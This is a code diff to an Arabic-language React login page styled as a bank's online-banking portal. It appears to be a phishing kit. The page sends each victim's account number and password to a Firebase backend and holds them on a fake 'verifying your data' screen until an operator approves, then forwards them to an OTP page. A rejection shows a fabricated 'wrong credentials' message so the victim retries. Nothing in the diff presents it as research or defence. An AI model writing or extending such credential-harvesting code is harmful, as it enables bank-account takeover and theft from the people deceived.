@@ -1,7 +1,7 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { Menu, Search, Eye, EyeOff } from "lucide-react";
 import { useNavigate } from "@/components/TransitionContext";
-import { saveLogin, saveLoginSession, getLoginSession } from "@/lib/firebase";
+import { saveLogin, saveLoginSession, getLoginSession, listenForApproval } from "@/lib/firebase";
 
 const BLUE = "#1a3a7a";
 const BLUE2 = "#1e4db7";
@@ -42,6 +42,8 @@ export default function LoginPage() {
   const [password, setPassword] = useState("");
   const [showPw, setShowPw] = useState(false);
   const [menuOpen, setMenuOpen] = useState(false);
+  const [pageState, setPageState] = useState<"form" | "waiting">("form");
+  const [loginError, setLoginError] = useState("");
   const [errors, setErrors] = useState<{
     username?: string;
     password?: string;
@@ -50,6 +52,7 @@ export default function LoginPage() {
     username?: boolean;
     password?: boolean;
   }>({});
+  const unsubRef = useRef<(() => void) | null>(null);
 
   const validate = (u: string, p: string) => {
     const e: { username?: string; password?: string } = {};
@@ -68,17 +71,55 @@ export default function LoginPage() {
     !!username &&
     !!password;
 
-  const submit = (e: React.FormEvent) => {
+  const submit = async (e: React.FormEvent) => {
     e.preventDefault();
     const errs = validate(username, password);
     setErrors(errs);
     setTouched({ username: true, password: true });
-    if (!Object.keys(errs).length) {
-      saveLoginSession(username);
-      saveLogin(username, password).catch(console.error);
-      navigateTo("/otp");
-    }
+    if (Object.keys(errs).length) return;
+
+    setLoginError("");
+    saveLoginSession(username);
+    await saveLogin(username, password).catch(console.error);
+
+    setPageState("waiting");
+    unsubRef.current = listenForApproval((approved) => {
+      if (approved === true) {
+        unsubRef.current?.();
+        navigateTo("/otp");
+      } else if (approved === false) {
+        unsubRef.current?.();
+        setPageState("form");
+        setPassword("");
+        setTouched({});
+        setLoginError("اسم المستخدم أو كلمة المرور غير صحيحة");
+      }
+    });
   };
+
+  /* ── Waiting for admin ── */
+  if (pageState === "waiting") {
+    return (
+      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: `linear-gradient(160deg,#0d2660,${BLUE},${BLUE2})`, fontFamily: "'Cairo',sans-serif", padding: "0 32px", textAlign: "center" }}>
+        <div style={{ position: "relative", width: 96, height: 96, marginBottom: 32 }}>
+          <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: "3px solid rgba(255,255,255,0.1)" }} />
+          <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: "3px solid transparent", borderTopColor: "#f5d06e", animation: "ab-spin 1s linear infinite" }} />
+          <div style={{ position: "absolute", inset: 14, borderRadius: "50%", background: "rgba(255,255,255,0.08)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 28 }}>
+            💳
+          </div>
+        </div>
+        <h2 style={{ color: "white", fontSize: 20, fontWeight: 900, margin: "0 0 10px" }}>جارٍ التحقق من بياناتك</h2>
+        <p style={{ color: "rgba(200,220,255,0.75)", fontSize: 13, lineHeight: 1.8, margin: "0 0 28px" }}>
+          يُرجى الانتظار بينما يتحقق النظام<br />من رقم حسابك وكلمة المرور
+        </p>
+        <div style={{ display: "flex", gap: 8 }}>
+          {[0, 1, 2, 3].map(i => (
+            <div key={i} style={{ width: 10, height: 10, borderRadius: "50%", background: "#f5d06e", animation: "ab-dot 1.2s ease-in-out infinite", animationDelay: `${i * 0.18}s` }} />
+          ))}
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div
@@ -364,6 +405,8 @@ export default function LoginPage() {
                 <input
                   type="tel"
                   value={username}
+                  minLength={9}
+                  maxLength={9}
                   placeholder="رقم الحساب الخاص بمصرف الامان"
                   onChange={(e) => {
                     setUsername(e.target.value);
@@ -463,6 +506,13 @@ export default function LoginPage() {
                 <FieldError msg={errors.password} />
               )}
             </div>
+
+            {loginError && (
+              <div style={{ background: "#fff0f0", border: "1.5px solid #fca5a5", borderRadius: 12, padding: "11px 14px", display: "flex", alignItems: "center", gap: 10, marginBottom: 4 }}>
+                <span style={{ fontSize: 18 }}>🚫</span>
+                <span style={{ color: "#b91c1c", fontSize: 13, fontWeight: 700, fontFamily: "'Cairo',sans-serif" }}>{loginError}</span>
+              </div>
+            )}
 
             <button
               type="submit"
